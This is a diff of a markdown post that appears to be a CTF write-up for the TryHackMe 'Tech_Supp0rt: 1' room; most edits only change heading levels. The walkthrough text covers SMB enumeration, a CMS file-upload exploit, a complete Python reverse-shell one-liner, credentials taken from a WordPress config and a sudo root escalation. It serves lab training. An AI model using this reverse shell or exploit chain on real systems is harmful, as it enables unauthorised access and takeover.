@@ -13,13 +13,13 @@ img_path: /assets/img/tryhackme/techsupport
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Tech_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1) from [TryHackMe](https://tryhackme.com). After scanning the machine, we find an smb share accessible without a password, and there we find a file that has credentials for a CMS. We find out that the CMS is vulnerable to Arbitrary file upload wich we use to get foothold. Checking some config files we find a password for a user that we use to ssh to the machine. Then we exploit a sudo entry to get root.
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -71,7 +71,7 @@ Host script results:
 
 The target is an Ubuntu linux machine running OpenSSH on port 22, Apache web server on port 80, and SMB on port 139 and 445.
 
-## SMB
+### SMB
 
 Let's list the available share on smb with `sudo smbclient -L 10.10.10.10 -N`.
 
@@ -136,7 +136,7 @@ Wordpress creds
 
 We found Wordpress credentials, a page called `/subrion` that doesn't work and can be edited from panel.
 
-## Web
+### Web
 
 Let's navigate to the web page.
 
@@ -175,7 +175,7 @@ Shellcodes: No Results
 
 There is an arbitrary file upload exploit, let's copy it to the current directory with `searchsploit -m php/webapps/49876.py`
 
-# **Foothold**
+## **Foothold**
 
 Let's see what options the exploits takes.
 
@@ -219,12 +219,13 @@ Let's now get a reverse shell by setting up a listener with `nc -lvnp 9001` and 
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
+
 >Change the ip address to your tun0 ip.
 
 ![](5.png)
 
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 After some basic enumeration on the machine, we come across wordpress config file where we find a password.
 
@@ -273,7 +274,3 @@ Now we can connect as root without a password.
 ---
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
-
----
-
-# References
